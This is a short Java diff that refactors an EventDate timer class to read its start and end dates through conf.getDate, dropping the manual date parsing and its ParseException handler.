@@ -31,15 +31,9 @@ public class EventDate extends BaseTimer {
 		needExitOnStop = false;
 
 		try {
-			DateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
-			dateFormat.setTimeZone(TimeZone.getTimeZone("UTC"));
-
-			String dateFromString = conf.getString("datefrom");
-			dateFrom = dateFormat.parse(dateFromString);
-
+			dateFrom = conf.getDate("datefrom");
 			if (conf.has("dateto")) {
-				String dateToString = conf.getString("dateto");
-				dateTo = dateFormat.parse(dateToString);
+				dateTo = conf.getDate("dateto");
 			} else {
 				dateTo = new Date(Long.MAX_VALUE);
 			}
@@ -49,17 +43,7 @@ public class EventDate extends BaseTimer {
 			}
 
 			return false;
-		} catch (ParseException e) {
-			if (Cfg.EXCEPTION) {
-				Check.log(e);
-			}
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (parse) Error: " + e);
-			}
-
-			return false;
-		}
+		} 
 
 		return true;
 	}
